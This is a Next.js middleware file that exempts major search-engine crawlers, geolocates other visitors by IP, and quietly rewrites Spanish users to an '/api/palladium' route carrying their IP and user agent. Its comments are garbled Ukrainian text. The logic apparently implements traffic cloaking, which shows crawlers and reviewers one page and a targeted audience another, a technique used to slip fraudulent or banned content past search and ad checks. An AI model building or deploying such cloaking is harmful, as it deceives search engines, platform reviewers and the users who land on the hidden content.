import { NextRequest, NextResponse } from 'next/server'

function isBot(ua: string) {
    return /googlebot|bingbot|yandex|duckduckbot|baiduspider/i.test(ua)
}

export async function middleware(req: NextRequest) {
    const ua = req.headers.get('user-agent')?.toLowerCase() || ''
    const ipHeader =
        req.headers.get('x-forwarded-for') ||
        req.headers.get('x-real-ip') ||
        req.headers.get('cf-connecting-ip') ||
        '8.8.8.8'
    const ip = ipHeader.split(',')[0].trim()

    // üü¢ –ë–æ—Ç–∞–º –Ω—ñ—á–æ–≥–æ –Ω–µ —á—ñ–ø–∞—î–º–æ ‚Äî –ø—Ä–æ–ø—É—Å–∫–∞—î–º–æ –¥–∞–ª—ñ
    if (isBot(ua)) {
        return NextResponse.next()
    }

    try {
        const geoRes = await fetch(`https://ipwho.is/${ip}`)
        const geo = await geoRes.json()

        const isSpain = geo.success && geo.country_code === 'ES'

        // üî• –¢—ñ–ª—å–∫–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ –Ü—Å–ø–∞–Ω—ñ—ó ‚Üí Palladium
        if (isSpain) {
            const url = req.nextUrl.clone()
            url.pathname = '/api/palladium'
            url.searchParams.set('ip', ip)
            url.searchParams.set('ua', ua)
            return NextResponse.rewrite(url)
        }

        // üü¢ –£—Å—ñ —ñ–Ω—à—ñ ‚Äî —Ä–µ–Ω–¥–µ—Ä–∏–º–æ —è–∫ —î
        return NextResponse.next()
    } catch (err) {
        console.error('[Middleware Error]', err)
        return NextResponse.next()
    }
}

export const config = {
    matcher: ['/', '/page', '/((?!_next|api|static|favicon.ico).*)'],
}
